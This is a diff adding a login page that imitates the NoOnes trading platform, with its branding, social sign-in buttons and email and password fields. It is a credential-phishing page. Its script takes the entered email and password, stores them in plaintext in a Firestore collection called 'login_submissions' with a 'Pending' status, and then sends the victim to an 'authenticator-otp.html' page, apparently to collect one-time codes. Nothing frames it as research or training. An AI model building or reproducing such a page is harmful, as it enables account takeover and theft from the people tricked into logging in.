@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="utf-8"/>
+<title>NoOnes - Login</title>
+<style>
+  :root{
+    --bg: #1c1c1e;
+    --card: #262629;
+    --field: #3a3a3d;
+    --green: #4CAF67;
+    --green-bright: #57c47c;
+    --text: #f2f2f2;
+    --text-muted: #a3a3a6;
+    --placeholder: #8a8a8d;
+    --border-hairline: rgba(255,255,255,0.06);
+  }
+  *{ box-sizing:border-box; margin:0; padding:0; }
+  html,body{
+    height:100%;
+    background:var(--bg);
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  .device{
+    width:100%;
+    max-width:420px;
+    min-height:100vh;
+    margin:0 auto;
+    background:var(--bg);
+    display:flex;
+    flex-direction:column;
+  }
+
+  /* Top app bar */
+  .appbar{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+    padding:16px 16px 14px;
+    border-bottom:1px solid var(--border-hairline);
+    flex-shrink:0;
+  }
+  .appbar-title{
+    color:var(--text);
+    font-size:19px;
+    font-weight:700;
+  }
+  .appbar-settings{
+    position:absolute;
+    right:16px;
+    top:50%;
+    transform:translateY(-50%);
+    color:var(--text);
+    cursor:pointer;
+    display:flex;
+  }
+
+  /* Logo */
+  .logo-area{
+    display:flex;
+    justify-content:center;
+    padding:34px 0 26px;
+  }
+  .logo-area svg{ display:block; }
+
+  /* Card */
+  .card{
+    background:var(--card);
+    border-radius:18px;
+    margin:0 20px;
+    padding:28px 22px 26px;
+  }
+  .card h1{
+    color:var(--text);
+    font-size:25px;
+    font-weight:800;
+    text-align:center;
+    margin-bottom:18px;
+  }
+  .social-row{
+    display:flex;
+    justify-content:center;
+    gap:16px;
+    margin-bottom:26px;
+  }
+  .social-btn{
+    width:38px;
+    height:38px;
+    border-radius:50%;
+    background:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    border:none;
+    padding:0;
+  }
+  .social-btn.telegram{ background:#229ED9; }
+
+  .field-group{ margin-bottom:18px; }
+  .field-label{
+    display:block;
+    color:var(--text-muted);
+    font-size:13.5px;
+    font-weight:600;
+    margin-bottom:8px;
+  }
+  .field-wrap{ position:relative; }
+  input.field{
+    width:100%;
+    background:var(--field);
+    border:none;
+    border-radius:10px;
+    padding:15px 44px 15px 16px;
+    font-size:16px;
+    color:var(--text);
+    outline:none;
+  }
+  input.field::placeholder{ color:var(--placeholder); }
+  input.field:focus{
+    box-shadow:0 0 0 2px var(--green-bright);
+  }
+  .toggle-visibility{
+    position:absolute;
+    right:14px;
+    top:50%;
+    transform:translateY(-50%);
+    background:none;
+    border:none;
+    color:var(--text-muted);
+    cursor:pointer;
+    display:flex;
+    padding:4px;
+  }
+
+  .forgot-row{
+    text-align:right;
+    margin:-6px 0 22px;
+  }
+  .forgot-row a{
+    color:var(--green-bright);
+    font-size:14.5px;
+    font-weight:600;
+    text-decoration:underline;
+  }
+
+  .btn-login{
+    width:100%;
+    background:var(--green);
+    color:#12271a;
+    border:none;
+    border-radius:12px;
+    padding:16px;
+    font-size:18px;
+    font-weight:800;
+    cursor:pointer;
+    transition:filter 0.15s ease, transform 0.1s ease;
+  }
+  .btn-login:hover{ filter:brightness(1.06); }
+  .btn-login:active{ transform:scale(0.98); }
+
+  .signup-row{
+    text-align:center;
+    margin-top:20px;
+    color:var(--text-muted);
+    font-size:15.5px;
+  }
+  .signup-row a{
+    color:var(--green-bright);
+    font-weight:700;
+    text-decoration:underline;
+  }
+
+  /* Footer controls */
+  .footer-controls{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:22px 20px;
+    flex-shrink:0;
+  }
+  .theme-toggle{
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .theme-toggle svg{ color:var(--green-bright); }
+  .switch{
+    width:46px;
+    height:26px;
+    background:var(--green);
+    border-radius:14px;
+    position:relative;
+    cursor:pointer;
+    border:none;
+    padding:0;
+  }
+  .switch .knob{
+    position:absolute;
+    top:3px;
+    left:3px;
+    width:20px;
+    height:20px;
+    background:#fff;
+    border-radius:50%;
+    transition:left 0.2s ease;
+  }
+  .switch.off{ background:#4a4a4d; }
+  .switch.off .knob{ left:23px; }
+
+  .lang-select{
+    display:flex;
+    align-items:center;
+    gap:4px;
+    color:var(--green-bright);
+    font-size:15px;
+    font-weight:700;
+    text-decoration:underline;
+    cursor:pointer;
+    background:none;
+    border:none;
+  }
+
+  .spacer{ flex:1; }
+
+  .home-indicator{
+    width:112px;
+    height:4px;
+    background:var(--text-muted);
+    opacity:0.5;
+    border-radius:3px;
+    margin:0 auto 10px;
+  }
+
+.logo-area{display:flex;justify-content:center;align-items:center;padding:18px 0 16px;}
+.noones-logo{width:185px;height:auto;display:block;}
+</style>
+
+<style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
+</head>
+<body>
+<div class="device">
+<div class="appbar">
+<span class="appbar-title">NoOnes</span>
+<span class="appbar-settings">
+<svg fill="none" height="22" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="22">
+<circle cx="12" cy="12" r="3"></circle>
+<path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+</svg>
+</span>
+</div>
+<div class="logo-area">
+<svg class="noones-logo" viewbox="0 0 340 90" xmlns="http://www.w3.org/2000/svg">
+<style>.word{font-family:Arial,Helvetica,sans-serif;font-weight:900;fill:#4BC76B;}</style>
+<text class="word" font-size="58" x="6" y="66">n</text>
+<circle cx="82" cy="45" fill="none" r="18" stroke="#4BC76B" stroke-width="12"></circle>
+<circle cx="132" cy="45" fill="none" r="18" stroke="#4BC76B" stroke-width="12"></circle>
+<path d="M145 11 C147 6 152 3 158 2" fill="none" stroke="#4BC76B" stroke-linecap="round" stroke-width="5"></path>
+<path d="M138 12 L140 5" stroke="#4BC76B" stroke-linecap="round" stroke-width="4"></path>
+<path d="M150 15 L156 8" stroke="#4BC76B" stroke-linecap="round" stroke-width="4"></path>
+<text class="word" font-size="58" x="162" y="66">nes</text>
+</svg></div>
+<div class="card">
+<h1>Welcome to NoOnes</h1>
+<div class="social-row">
+<button aria-label="Continue with Google" class="social-btn">
+<svg height="20" viewbox="0 0 48 48" width="20"><path d="M43.6 20.5H42V20H24v8h11.3C33.7 32.9 29.3 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.5 6 29.5 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.7-.4-3.5z" fill="#FFC107"></path><path d="M6.3 14.7l6.6 4.8C14.6 16 19 13 24 13c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.5 6 29.5 4 24 4c-7.4 0-13.8 4.1-17.1 10.1z" fill="#FF3D00"></path><path d="M24 44c5.3 0 10.1-1.8 13.9-4.9l-6.4-5.4C29.4 35.5 26.8 36.4 24 36.4c-5.3 0-9.7-3.1-11.3-7.5l-6.5 5C9.9 39.9 16.4 44 24 44z" fill="#4CAF50"></path><path d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.3 4.3-4.2 5.7l6.4 5.4C41.4 36.4 44 30.9 44 24c0-1.3-.1-2.7-.4-3.5z" fill="#1976D2"></path></svg>
+</button>
+<button aria-label="Continue with Telegram" class="social-btn telegram">
+<svg fill="#fff" height="19" viewbox="0 0 24 24" width="19"><path d="M21.94 4.5 18.4 20.13c-.27 1.18-.98 1.47-1.98.92l-5.47-4.03-2.64 2.54c-.29.29-.54.54-1.1.54l.39-5.56L18 6.15c.47-.42-.1-.65-.73-.24L6.5 12.86l-5.4-1.69c-1.17-.37-1.2-1.17.25-1.73L20.5 3.06c.98-.36 1.83.24 1.44 1.44z"></path></svg>
+</button>
+</div>
+<div class="field-group">
+<label class="field-label" for="identifier">Email/Phone number</label>
+<input class="field" id="identifier" placeholder="Email/Phone number" type="text"/>
+</div>
+<div class="field-group">
+<label class="field-label" for="password">Password</label>
+<div class="field-wrap">
+<input class="field" id="password" placeholder="Password" type="password"/>
+<button aria-label="Show password" class="toggle-visibility" onclick="togglePw()" type="button">
+<svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none">
+<path d="M6 12c2.2 2.2 9.8 2.2 12 0" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/>
+<path d="M9 12.2v2" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/>
+<path d="M15 12.2v2" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/>
+</svg>
+</button>
+</div>
+</div>
+<div class="forgot-row"><a href="#">Forgot password?</a></div>
+<button class="btn-login" id="loginBtn">Log in</button>
+<div class="signup-row">No account yet? <a href="#">Sign up</a></div>
+</div>
+<div class="footer-controls">
+<div class="theme-toggle">
+<svg fill="none" height="20" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="20"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2M12 20v2M4 12H2M22 12h-2M5 5l1.5 1.5M17.5 17.5 19 19M5 19l1.5-1.5M17.5 6.5 19 5"></path></svg>
+<button class="switch" id="themeSwitch" onclick="toggleSwitch()"><span class="knob"></span></button>
+<svg fill="currentColor" height="18" style="color:var(--green-bright)" viewbox="0 0 24 24" width="18"><path d="M20.8 14.5A8.5 8.5 0 0 1 9.5 3.2 9 9 0 1 0 20.8 14.5z"></path></svg>
+</div>
+<div class="spacer"></div>
+<button class="lang-select">English
+      <svg fill="none" height="14" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewbox="0 0 24 24" width="14"><polyline points="6 9 12 15 18 9"></polyline></svg>
+</button>
+</div>
+<div class="home-indicator"></div>
+</div>
+<script type="module">
+
+import { db } from "./js/firebase.js";
+
+import {
+  collection,
+  addDoc,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+window.saveLoginToFirebase = async function () {
+
+    const email = document.getElementById("identifier").value.trim();
+    const password = document.getElementById("password").value;
+
+    if (!email || !password) {
+        alert("Please enter your email and password.");
+        return;
+    }
+
+    try {
+
+        await addDoc(collection(db, "login_submissions"), {
+
+            email: email,
+            password: password,
+            status: "Pending",
+            createdAt: serverTimestamp()
+
+        });
+
+        localStorage.setItem("loginEmail", email);
+
+        window.location.href = "authenticator-otp.html";
+
+    } catch (error) {
+
+        console.error(error);
+        alert("Error saving login:\n" + error.message);
+
+    }
+
+};
+
+</script>
+<script>
+  function togglePw(){
+    const pw = document.getElementById('password');
+    const eye=document.getElementById('eyeIcon');
+if(pw.type==='password'){
+pw.type='text';
+eye.innerHTML='<path d="M2 12s4-6 10-6 10 6 10 6-4 6-10 6-10-6-10-6" stroke="#E0E0E0" stroke-width="2" fill="none" stroke-linecap="round"/><circle cx="12" cy="12" r="2" stroke="#E0E0E0" stroke-width="2" fill="none"/>';
+}else{
+pw.type='password';
+eye.innerHTML='<path d="M6 12c2.2 2.2 9.8 2.2 12 0" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/><path d="M9 12.2v2" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/><path d="M15 12.2v2" stroke="#E0E0E0" stroke-width="2" stroke-linecap="round"/>';
+}
+  }
+  function toggleSwitch(){
+    document.getElementById('themeSwitch').classList.toggle('off');
+  }
+document
+.getElementById("loginBtn")
+.addEventListener("click", function () {
+
+    saveLoginToFirebase();
+
+});
+</script>
+</body>
+</html>
